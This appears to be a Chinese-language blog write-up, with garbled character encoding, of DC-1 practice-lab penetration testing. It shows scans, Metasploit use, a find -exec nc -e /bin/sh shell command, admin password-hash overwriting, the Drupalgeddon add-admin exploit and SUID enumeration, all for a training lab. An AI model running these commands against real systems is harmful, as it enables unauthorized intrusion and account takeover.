<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="æ¸—é€é¶æœºæ€»ç»“"><meta name="keywords" content=""><meta name="author" content="George"><meta name="copyright" content="George"><title>æ¸—é€é¶æœºæ€»ç»“ | A.</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Dc1"><span class="toc-number">1.</span> <span class="toc-text">Dc1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ä¿¡æ¯æ”¶é›†"><span class="toc-number">1.1.</span> <span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">1.3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">1.4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">1.5.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thefinalflag"><span class="toc-number">1.6.</span> <span class="toc-text">thefinalflag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC2"><span class="toc-number">2.</span> <span class="toc-text">DC2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ä¿¡æ¯æ”¶é›†-1"><span class="toc-number">2.1.</span> <span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1-1"><span class="toc-number">2.2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2-1"><span class="toc-number">2.3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#é—®é¢˜1ã€hydraã€‘"><span class="toc-number">2.4.</span> <span class="toc-text">é—®é¢˜1ã€hydraã€‘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-1"><span class="toc-number">2.5.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4-1"><span class="toc-number">2.6.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thefinalflag-1"><span class="toc-number">2.7.</span> <span class="toc-text">thefinalflag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-3"><span class="toc-number">3.</span> <span class="toc-text">DC-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ä¿¡æ¯æ”¶é›†-2"><span class="toc-number">3.1.</span> <span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç "><span class="toc-number">3.2.</span> <span class="toc-text">sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#å¯¹hashå¯†ç è¿›è¡Œè§£å¯†"><span class="toc-number">3.3.</span> <span class="toc-text">å¯¹hashå¯†ç è¿›è¡Œè§£å¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬"><span class="toc-number">3.4.</span> <span class="toc-text">åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#åå¼¹bashåˆ°kaliä¸Š"><span class="toc-number">3.5.</span> <span class="toc-text">åå¼¹bashåˆ°kaliä¸Š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ææƒ"><span class="toc-number">3.6.</span> <span class="toc-text">ææƒ</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">98</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">æ¸—é€é¶æœºæ€»ç»“</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="Dc1"><a href="#Dc1" class="headerlink" title="Dc1"></a>Dc1</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.33.136</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22&#x2F;tcp  open  ssh</span><br><span class="line">80&#x2F;tcp  open  http</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">MAC Address: 00:0C:29:34:9E:E8 (VMware)</span><br></pre></td></tr></table></figure>

<p>ipï¼š192.168.33.136</p>
<p>ç«¯å£ï¼š</p>
<p>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind</p>
<p>22ï¼šè¯•ç€å°è¯•sshå…å¯†ç™»å½•ï¼Ÿï¼Ÿï¼Ÿ</p>
<p>è¿™é‡Œå¯ä»¥hydraçˆ†ç ´ä¸€æ³¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>80ï¼šç›´æ¥è®¿é—®ç½‘é¡µ</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/1-1.png" alt="1-1"></p>
<p>ç”¨dirsearchæ‰«äº†ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[08:46:04] 200 -    1KB - &#x2F;COPYRIGHT.txt                                   </span><br><span class="line">[08:46:14] 200 -   17KB - &#x2F;INSTALL                           </span><br><span class="line">[08:46:15] 200 -    1KB - &#x2F;INSTALL.mysql.txt</span><br><span class="line">[08:46:15] 200 -    2KB - &#x2F;INSTALL.pgsql.txt</span><br><span class="line">[08:46:15] 200 -   17KB - &#x2F;INSTALL.txt</span><br><span class="line">[08:46:16] 200 -   18KB - &#x2F;LICENSE                         </span><br><span class="line">[08:46:16] 200 -   18KB - &#x2F;LICENSE.txt</span><br><span class="line">[08:46:16] 200 -    8KB - &#x2F;MAINTAINERS.txt                 </span><br><span class="line">[08:46:22] 200 -    5KB - &#x2F;README                    </span><br><span class="line">[08:46:23] 200 -    5KB - &#x2F;README.txt                 </span><br><span class="line">[08:46:33] 200 -    9KB - &#x2F;UPGRADE                                         </span><br><span class="line">[08:46:33] 200 -    9KB - &#x2F;UPGRADE.txt</span><br><span class="line">[08:51:42] 301 -  319B  - &#x2F;includes  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;includes&#x2F;    </span><br><span class="line">[08:51:46] 200 -    7KB - &#x2F;index.php                      </span><br><span class="line">[08:52:37] 301 -  315B  - &#x2F;misc  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;misc&#x2F;</span><br><span class="line">[08:52:41] 301 -  318B  - &#x2F;modules  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;modules&#x2F;</span><br><span class="line">[08:52:57] 200 -    7KB - &#x2F;node                                             </span><br><span class="line">[08:53:50] 301 -  319B  - &#x2F;profiles  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;profiles&#x2F;</span><br><span class="line">[08:54:06] 200 -    2KB - &#x2F;robots.txt                     </span><br><span class="line">[08:54:11] 301 -  318B  - &#x2F;scripts  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;scripts&#x2F;</span><br><span class="line">[08:54:31] 301 -  316B  - &#x2F;sites  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;sites&#x2F;</span><br><span class="line">[08:54:32] 200 -  952B  - &#x2F;sites&#x2F;all&#x2F;modules&#x2F;README.txt</span><br><span class="line">[08:54:32] 200 -    0B  - &#x2F;sites&#x2F;example.sites.php</span><br><span class="line">[08:54:32] 200 -  904B  - &#x2F;sites&#x2F;README.txt</span><br><span class="line">[08:54:32] 200 -  767B  - &#x2F;sites&#x2F;all&#x2F;themes&#x2F;README.txt</span><br><span class="line">[08:55:04] 301 -  317B  - &#x2F;themes  -&gt;  http:&#x2F;&#x2F;192.168.33.136&#x2F;themes&#x2F;      </span><br><span class="line">[08:55:22] 200 -    7KB - &#x2F;user                                </span><br><span class="line">[08:55:22] 200 -    7KB - &#x2F;user&#x2F;                     </span><br><span class="line">[08:55:23] 200 -    7KB - &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">[08:55:37] 200 -    2KB - &#x2F;web.config                  </span><br><span class="line">[08:55:58] 200 -   42B  - &#x2F;xmlrpc.php</span><br></pre></td></tr></table></figure>

<p>robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt</span><br><span class="line">#</span><br><span class="line"># This file is to prevent the crawling and indexing of certain parts</span><br><span class="line"># of your site by web crawlers and spiders run by sites like Yahoo!</span><br><span class="line"># and Google. By telling these &quot;robots&quot; where not to go on your site,</span><br><span class="line"># you save bandwidth and server resources.</span><br><span class="line">#</span><br><span class="line"># This file will be ignored unless it is at the root of your host:</span><br><span class="line"># Used:    http:&#x2F;&#x2F;example.com&#x2F;robots.txt</span><br><span class="line"># Ignored: http:&#x2F;&#x2F;example.com&#x2F;site&#x2F;robots.txt</span><br><span class="line">#</span><br><span class="line"># For more information about the robots.txt standard, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.robotstxt.org&#x2F;wc&#x2F;robots.html</span><br><span class="line">#</span><br><span class="line"># For syntax checking, see:</span><br><span class="line"># http:&#x2F;&#x2F;www.sxw.org.uk&#x2F;computing&#x2F;robots&#x2F;check.html</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br></pre></td></tr></table></figure>



<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>msfconsole:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use   å¯¹åº”æ¨¡å—</span><br><span class="line">show options  æŸ¥çœ‹ä¿¡æ¯</span><br><span class="line">set rhosts  è¿œç¨‹ä¸»æœºip</span><br><span class="line">run   æ”»å‡»</span><br><span class="line">exploit æ”»å‡»</span><br><span class="line"></span><br><span class="line">shell 	æ‹¿åˆ°æƒé™</span><br></pre></td></tr></table></figure>



<p>ä½¿ç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shellã€æ–¹ä¾¿åç»­æ“ä½œã€‘</p>
<blockquote>
<p>æ–¹æ³•ä¸€ï¼š</p>
<p>shell #æƒé™ï¼Œä¸æ˜¯æœ¬åœ°ï¼Œæ˜¯httpé“¾æ¥ï¼Œéœ€è¦ä¸€ä¸ªæŒä¹…é“¾æ¥ï¼Œåå¼¹ä¸€ä¸ªäº¤äº’shell</p>
<p>python -c â€œimport pty;pty.spawn(â€˜/bin/bashâ€™)â€</p>
<p>æ–¹æ³•äºŒï¼š</p>
<p>find /var/www/test -exec nc -lvp 9999 -e /bin/sh ;</p>
<p>nc 192.168.0.119 9999</p>
</blockquote>
<p>/var/www/profiles/testing:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version &#x3D; &quot;7.24&quot;</span><br><span class="line">project &#x3D; &quot;drupal&quot;</span><br><span class="line">datestamp &#x3D; &quot;1384983240&quot;</span><br></pre></td></tr></table></figure>





<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#39;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;drupaldb&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥æ•°æ®åº“ï¼ŒæŸ¥çœ‹usersè¡¨ï¼Œå‘ç°adminçš„å¯†ç è¢«åŠ å¯†ã€‚</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><strong>æ–¹æ³•ä¸€ï¼š</strong>ã€ä¿®æ”¹ç®¡ç†å‘˜å¯†ç ã€‘</p>
<p>æŸ¥çœ‹å®˜ç½‘æ–‡æ¡£+StackOverflow</p>
<p>å‘ç°mysqlåŠ å¯†è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts&#x2F;password-hash.sh &#39;pass&#39;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh &#39;passwd&#39;</span><br><span class="line">php scripts&#x2F;password-hash.sh &#39;passwd&#39;</span><br><span class="line"></span><br><span class="line">password: passwd                hash: $S$DYUw2bI4eMoDktLEjoauViDb4yDZCQBI0bA7yoJa3oZNRHcZQgQH</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh ppap</span><br><span class="line">php scripts&#x2F;password-hash.sh ppap</span><br><span class="line"></span><br><span class="line">password: ppap          hash: $S$DCKCzF&#x2F;33eff52x&#x2F;Po.lQ5bYwDBAy8oVs&#x2F;8mZ7.GNaXFkjxyixXi</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬è™½ç„¶ä¸èƒ½è§£å¯†å¯†ç å¯æ˜¯å¯ä»¥æ›´æ–°ç®¡ç†å‘˜çš„å¯†ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users SET pass&#x3D;&#39;$S$D5iUQJACoD2gCDtE0WaoCMmsoNPVD7Q84aXuHjuoIKwHhD9aKh9Z&#39; where name&#x3D;&#39;admin&#39;;</span><br></pre></td></tr></table></figure>





<p><strong>æ–¹æ³•äºŒï¼š</strong>ã€æ·»åŠ å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ã€‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æŸ¥çœ‹å…·ä½“ç‰ˆæœ¬</span><br><span class="line">cat includes&#x2F;bootstrap.inc | grep VERSION</span><br><span class="line">define(&#39;VERSION&#39;, &#39;7.24&#39;);</span><br><span class="line">      $has_openssl &#x3D; version_compare(PHP_VERSION, &#39;5.3.4&#39;, &#39;&gt;&#x3D;&#39;) &amp;&amp; function_exists(&#39;openssl_random_pseudo_bytes&#39;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Add Admin User)                                                          | php&#x2F;webapps&#x2F;34992.py</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Admin Session)                                                           | php&#x2F;webapps&#x2F;44355.php</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (1)                                                | php&#x2F;webapps&#x2F;34984.py</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (2)                                                | php&#x2F;webapps&#x2F;34993.php</span><br><span class="line">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Remote Code Execution)                                                   | php&#x2F;webapps&#x2F;35150.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€AGsite)-[&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps]</span><br><span class="line">â””â”€# python 34992.py -t http:&#x2F;&#x2F;192.168.33.136 -u userAG -p 123456</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> flag3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</span><br></pre></td></tr></table></figure>







<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>åœ¨/etc/passwdé‡Œæ‰¾åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag4:x:1001:1001:Flag4,,,:&#x2F;home&#x2F;flag4:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€å‘ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ cat flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>





<h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>ä¼°è®¡æ˜¯è¦ææƒäº†</p>
<blockquote>
<p>ã€SUIDææƒã€‘</p>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p>find / -user root -perm -4000 -exec ls -ldb { }</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;pt_chown</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span 